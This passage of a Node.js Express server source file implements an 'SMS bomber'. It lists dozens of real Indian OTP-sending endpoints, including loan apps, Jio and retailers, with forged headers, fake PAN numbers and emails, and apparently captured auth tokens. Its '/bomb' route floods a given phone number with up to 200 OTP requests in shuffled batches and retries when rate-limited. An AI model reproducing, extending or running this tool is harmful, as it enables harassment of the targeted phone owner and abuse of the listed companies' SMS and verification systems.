        data: (phone) => JSON.stringify({ mobile: phone, captchaKey: null })
    },
    {
        name: "PocketCredit",
        url: "https://pocketcredit.in/api/auth/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://pocketcredit.in",
            "Referer": "https://pocketcredit.in/auth"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "ClickForMoney",
        url: "https://clickformoney.in/api/sendOtp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://clickformoney.in",
            "referer": "https://clickformoney.in/apply-now"
        },
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "JhatpatCash",
        url: "https://apilm.jhatpatcash.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "app.jhatpatcash.com",
            "Origin": "https://app.jhatpatcash.com",
            "Referer": "https://app.jhatpatcash.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "cashteisvjd@gmail.com", occupationTypeId: "7", monthlySalary: "537078", panCard: "GSISB5468H", brandId: "d7c6bc00-9517-4d20-86f7-78b07f18a46d", domain: "app.jhatpatcash.com" })
    },
    {
        name: "QuaLoan",
        url: "https://apilm.qualoan.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "app.qualoan.com",
            "Origin": "https://app.qualoan.com",
            "Referer": "https://app.qualoan.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "devgjshdkbdjb@gmail.com", occupationTypeId: "7", monthlySalary: "65000", panCard: "VUJVU5675H", brandId: "4b2f828d-e7d4-45d2-be7d-f2a0ee6a70ae", domain: "app.qualoan.com" })
    },
    {
        name: "NexiLoans",
        url: "https://api-backend.nexiloans.com/user/otp/send",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://apply.nexiloans.com",
            "referer": "https://apply.nexiloans.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "ToofanLoan",
        url: "https://apilm.toofanloan.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "app.toofanloan.com",
            "Origin": "https://app.toofanloan.com",
            "Referer": "https://app.toofanloan.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "testbdkdfbosb@gmail.com", occupationTypeId: "7", monthlySalary: "52800", panCard: "TSISV5434B", brandId: "4dd2f611-32b6-42a4-a14b-d493dc885000", domain: "app.toofanloan.com" })
    },
    {
        name: "Rupee4u",
        url: "https://loanapply.rupee4u.com/api/login",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://loanapply.rupee4u.com",
            "Referer": "https://loanapply.rupee4u.com/auth"
        },
        data: (phone) => JSON.stringify({ mobile: phone, captchaKey: null })
    },
    {
        name: "Creditt",
        url: "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "appStore": "web_app",
            "api_version": "1.0",
            "deviceId": "device_abc123",
            "trackingId": "tracking_abc123",
            "appVersion": "1.0.21",
            "platform": "3",
            "Origin": "https://loan.credittnow.com",
            "Referer": "https://loan.credittnow.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "FundsBull",
        url: "https://backend.fundsbull.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://fundsbull.com",
            "Referer": "https://fundsbull.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "RupeeRedee",
        url: "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "applicationid": "",
            "deviceid": "abc-uuid",
            "platform": "Web",
            "origin": "https://www.rupeeredee.com",
            "referer": "https://www.rupeeredee.com/"
        },
        data: (phone) => JSON.stringify({ number: "+91" + phone, type: "Mobile" })
    },
    {
        name: "PaisaInTime",
        url: "https://micro-server-for-paisaintime-nrbe5.ondigitalocean.app/api/auth/get_otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client-id": "08b61f94-4e99-4d4e-abe9-108a1078bbdb",
            "origin": "https://www.paisaintime.com",
            "referer": "https://www.paisaintime.com/"
        },
        data: (phone) => JSON.stringify({ phoneNo: phone, clientId: "08b61f94-4e99-4d4e-abe9-108a1078bbdb" })
    },
    {
        name: "FastPaise",
        url: "https://backend.fastpaise.in/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://fastpaise.in",
            "Referer": "https://fastpaise.in/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },
    {
        name: "DuniyaFinance",
        url: "https://backend.duniyafinance.in/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://duniyafinance.com",
            "Referer": "https://duniyafinance.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },
    {
        name: "BlinkrLoan",
        url: "https://backend.blinkrloan.com/api/user/v3/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "withCredentials": "true",
            "Origin": "https://www.blinkrloan.com",
            "Referer": "https://www.blinkrloan.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" })
    },
    {
        name: "NaukriLoans",
        url: "https://backend.naukriloans.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://naukriloans.com",
            "Referer": "https://naukriloans.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },
    {
        name: "UdharCapital",
        url: "https://www.udharcapital.com/api/send_otp.php",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.udharcapital.com",
            "referer": "https://www.udharcapital.com/apply-loan.php?slug=personal-loan"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "SalaryBolt",
        url: "https://backend.salarybolt.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://salarybolt.com",
            "referer": "https://salarybolt.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },
    {
        name: "SabkaLoan",
        url: "https://api.sabkaloan.com/api/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://sabkaloan.com",
            "Referer": "https://sabkaloan.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "PaisaPop",
        url: "https://apilm.paisapop.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "web.paisapop.com",
            "Origin": "https://web.paisapop.com",
            "Referer": "https://web.paisapop.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "popbxkddndn@gmail.com", occupationTypeId: "7", monthlySalary: "538355", panCard: "FUOUR2389B", brandId: "165a2d32-d1bd-4287-b2db-104a7feee308", domain: "web.paisapop.com" })
    },
    {
        name: "MinutesLoan",
        url: "https://apilm.minutesloan.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "app.minutesloan.com",
            "Origin": "https://app.minutesloan.com",
            "Referer": "https://app.minutesloan.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "temlsw@gmail.com", occupationTypeId: "7", monthlySalary: "55000", panCard: "ABCDE5438F", brandId: "0dbae4da-461a-4959-aa82-6a788de61593", domain: "app.minutesloan.com" })
    },
    {
        name: "AyushmanLoan",
        url: "https://backend.ayushmanloan.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://ayushmanloan.com",
            "Referer": "https://ayushmanloan.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },
    {
        name: "F1SpeedLoan",
        url: "https://backend.f1speedloan.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://f1speedloan.com",
            "Referer": "https://f1speedloan.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },
    {
        name: "FundoBaba",
        url: "https://backend.fundobaba.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://fundobaba.com",
            "Referer": "https://fundobaba.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },
    {
        name: "UdhaarPortal",
        url: "https://crm.udhaarportal.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM=",
            "Origin": "https://www.udhaarportal.com",
            "Referer": "https://www.udhaarportal.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, event_name: "login", utm_source: "", utm_medium: "", utm_campaign: "", utm_term: "", utm_content: "" })
    },
    {
        name: "InCred",
        url: "https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.incred.com",
            "Referer": "https://www.incred.com/"
        },
        data: (phone) => JSON.stringify({
            MOBILE: phone,
            UTM_DETAILS: { partnerId: "9250608873861026P", utm_source: "google", utm_medium: "cpc", utm_campaign: "ww_search_personal_loan_new_flow_phrase_match_kwds_ad1", utm_content: "161898739141", utm_term: "instant personal loan", gad_source: "1", gad_campaignid: "21491629100", gbraid: "0AAAAAphX73LaoflGejQFIvf-O7_s0BaY8", gclid: "EAIaIQobChMI9O--75iQkgMVn3oPAh32DgPgEAMYASAAEgKxyPD_BwE" },
            ON_BOARDING_TYPE: "FROM_LOAN_ENQUIRY",
            STATUS: "Pending"
        })
    },
    {
        name: "RamFincorp",
        url: "https://loan-api.ramfincorp.com/customers/customer-login-byMobile",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://loan.ramfincorp.com",
            "Referer": "https://loan.ramfincorp.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "JioSaavn",
        url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.jiosaavn.com",
            "Referer": "https://www.jiosaavn.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "Cashvia",
        url: "https://customer-backend.cashvia.in/customers/customer-login",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1",
            "Origin": "https://applynow.cashvia.in",
            "Referer": "https://applynow.cashvia.in/"
        },
        data: (phone) => JSON.stringify({ phoneNo: phone, journey_down: true })
    },
    {
        name: "Jio",
        url: "https://www.jio.com/api/jio-login-service/login/sendOtp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJKSU8uQ09NIiwic3ViIjoiZWFiODMzNzgtMTcyOC00NWQzLWJmNjMtNTIyMDkyODMyYjUwIiwiaWF0IjoxNzY3ODY1OTE3LCJleHAiOjE3Njc4NjY4MTd9.V75wqkAxZaucCvUliNwA2qa2KQNMYySPgzGwZEr0amY",
            "Origin": "https://www.jio.com",
            "Referer": "https://www.jio.com/selfcare/login/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone, loginFlowType: "MOBILE", alternateNumber: "" })
    },
    {
        name: "Sephora",
        url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==",
            "x-fp-signature": "v1.1:82658e094becb14ba6a75fcca29dd5e7f1cb0767978485c12185178ff7ad198b",
            "x-fp-date": "20260108T112314Z",
            "x-fp-sdk-version": "3.3.2",
            "Origin": "https://sephora.in",
            "Referer": "https://sephora.in/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" })
    },
    {
        name: "Moneyview",
        url: "https://pwa.gw.moneyview.in/uis/pwa/generate-otp",
        method: "POST",
        headers: {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymR7z7x8fbdmHNVcw",
            "Origin": "https://moneyview.in",
            "Referer": "https://moneyview.in/"
        },
        data: (phone) => `------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="key"\r\n\r\nMOBILE\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n${phone}\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="source"\r\n\r\npwa\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw--\r\n`
    },
    {
        name: "NoBroker",
        url: "https://www.nobroker.in/api/v3/account/otp/send",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.nobroker.in",
            "Referer": "https://www.nobroker.in/"
        },
        data: { "_raw": "phone={phone}&countryCode=IN" }
    },
    {
        name: "RojgarKaro_SendOTP",
        url: "https://rojgarkaro.in/api/auth/sendOTP",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://rojgarkaro.in",
            "Referer": "https://rojgarkaro.in/"
        },
        data: (phone) => JSON.stringify({ mobile_no: phone, isSessionActive: false })
    },
    {
        name: "RojgarKaro_Signup",
        url: "https://rojgarkaro.in/api/auth/sendOTPOnSignup",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://rojgarkaro.in",
            "Referer": "https://rojgarkaro.in/signup"
        },
        data: (phone) => JSON.stringify({ mobile_no: phone, email_id: "test@gmail.com", isSessionActive: false })
    },
    {
        name: "Adview",
        url: "https://adview.in/api/auth/send-otp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://adview.in",
            "Referer": "https://adview.in/auth?ref=V7XJLX"
        },
        data: (phone) => JSON.stringify({ mobile: phone, signupPayload: { username: "User_1234", email: "test1234@gmail.com", password: "Pass@1234", confirmPassword: "Pass@1234", referralCode: "V7XJLX" } })
    },
    {
        name: "Smytten",
        url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, email: "test@example.com" })
    },
    {
        name: "ServeTel",
        url: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "GoPink Cabs",
        url: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "check_mobile_number=1&contact={phone}" }
    },
    {
        name: "MyHubble Money",
        url: "https://api.myhubble.money/v1/auth/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phoneNumber: phone, channel: "SMS" })
    },
    {
        name: "Tata Capital Business",
        url: "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" })
    },
    {
        name: "Housing.com",
        url: "https://login.housing.com/api/v2/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, country_url_name: "in" })
    },
    {
        name: "Animall",
        url: "https://animall.in/zap/auth/login",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" })
    },
    {
        name: "Entri",
        url: "https://entri.app/api/v3/users/check-phone/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "A23 Games",
        url: "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, device_id: "android123", model: "Google,Android SDK built for x86,10" })
    },
    {
        name: "Lifestyle Stores",
        url: "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ signInMobile: phone, channel: "sms" })
    },
    {
        name: "WorkIndia",
        url: "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        method: "GET",
        headers: {}
    },
    {
        name: "Wellness Forever",
        url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "HealthMug",
        url: "https://api.healthmug.com/account/createotp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Vyapar",
        url: "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "CodFirm",
        url: "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        method: "GET",
        headers: {}
    },
    {
        name: "Swipe",
        url: "https://app.getswipe.in/api/user/mobile_login",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, resend: true })
    },
    {
        name: "Country Delight",
        url: "https://api.countrydelight.in/api/v1/customer/requestOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user" })
    },
    {
        name: "AstroSage_New",
        url: "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Revv",
        url: "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phoneNumber: phone, appVersion: "1.0", deviceType: "website" })
    },
    {
        name: "PayMe India",
        url: "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone_number: phone, app_signature: "S10ePIIrbH3" })
    },
    {
        name: "SSM Jewellery",
        url: "https://retail.ssmjewellery.in/ssmetail/index.php/mobile_api/generateOTP?mobile={phone}&email=testing@gmail.com&response_type=web&nocache=1779963941843",
        method: "GET",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "origin": "https://ssmjewellery.in",
            "x-requested-with": "via.bolte",
            "referer": "https://ssmjewellery.in/"
        }
    }
];

console.log(`✅ Loaded ${APIS.length} total APIs`);
console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);

// ============================================================
// ===== API CALL FUNCTION (Rate Limit Retry) =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: 5000,
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        return { status: response.status, success: true, responseTime };
    } catch (err) {
        const responseTime = Date.now() - startTime;
        
        const isRateLimit = err.response && err.response.status === 429;
        
        if (isRateLimit && api.rateLimit && retryCount < 3) {
            console.log(`  🚫 ${api.name} → 429 RATE_LIMITED, retrying in 3s (${retryCount + 1}/3)...`);
            await new Promise(r => setTimeout(r, 3000));
            return makeApiCall(api, phone, retryCount + 1);
        }
        
        if (retryCount < 1 && 
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        
        let statusCode = null;
        if (err.response) statusCode = err.response.status;
        
        return { status: statusCode, success: false, responseTime };
    }
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        apis: APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);

    try {
        const startTime = Date.now();
        let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
        const apiList = APIS;
        const BATCH_SIZE = 5;
        
        let maxRequests = 100;
        if (effectiveDuration <= 1) maxRequests = 200;
        else if (effectiveDuration <= 5) maxRequests = 150;
        else if (effectiveDuration <= 10) maxRequests = 100;
        else maxRequests = 80;

        const shuffled = [...apiList];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let sent = 0;
        for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
            const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
            
            const results = await Promise.allSettled(
                batch.map(api => makeApiCall(api, phone))
            );
            
            for (let k = 0; k < results.length; k++) {
                const result = results[k];
                const api = batch[k];
                
                if (result.status === 'fulfilled' && result.value && result.value.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp');
                    const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
                    
                    console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);
                    
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else {
                    const apiName = api.name || '';
                    const status = result.value?.status || 'FAIL';
                    const responseTime = result.value?.responseTime || 0;
                    
                    if (status === 429) {
                        console.log(`  🚫 ${apiName} → 429 RATE_LIMITED (${responseTime}ms)`);
                    } else {
                        console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms)`);
                    }
                }
            }
            
            if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
                await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
            }
        }

        const elapsed = (Date.now() - startTime) / 1000;
        
        console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s\n`);
        
        res.json({
            success: true,
            phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: success,
            sms: smsCount,
            calls: callCount,
            whatsapp: whatsappCount,
            elapsed: elapsed.toFixed(1) + 's',
            total_apis: APIS.length
        });
        
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        apis: APIS.map(a => a.name),
        rate_limit_apis: APIS.filter(a => a.rateLimit).map(a => a.name),
        instances: process.env.INSTANCE_NAME || 'api'
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server running on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 Total APIs: ${APIS.length}`);
    console.log(`   🟢 Tier 1 (Reliable): 6`);
    console.log(`   🟡 Tier 2 (Purani): 5`);
    console.log(`   🟢 Tier 3 (Nayi): 5`);
    console.log(`   🆕 New Working: 4`);
    console.log(`   ⚠️  Rate Limited: ${APIS.filter(a => a.rateLimit).length}`);
    console.log(`   🔥 NAYI APIs: 85+`);
    console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
    console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
    console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
});
